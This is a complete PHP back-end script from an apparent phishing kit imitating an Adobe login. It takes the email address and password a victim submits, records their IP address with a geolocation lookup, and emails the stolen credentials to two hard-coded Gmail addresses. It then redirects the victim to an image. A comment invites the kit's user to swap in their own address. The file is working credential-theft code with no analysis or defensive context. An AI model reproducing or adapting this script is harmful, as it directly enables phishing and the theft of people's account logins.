<?php
$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$message .= "|----------| ADOB3 Rezultz |--------------|\n";
$message .= "|eMail : ".$_POST['email']."\n";
$message .= "|PasSword : ".$_POST['password']."\n";
$message .= "|--------------- I N F O | I P -------------------|\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "|----------- Created By Jagaban --------------|\n";
//>> CHANGE YOUR EMAIL HERE  Jagaban<<
$send = "jagaban88995@gmail.com";
$send2 = "felorado79@gmail.com";
$subject = "$country | $ip";
{
mail("$send", "$subject", $message);   
mail("$send2", "$subject", $message); 
}
header("Location: bg.jpg");
?>
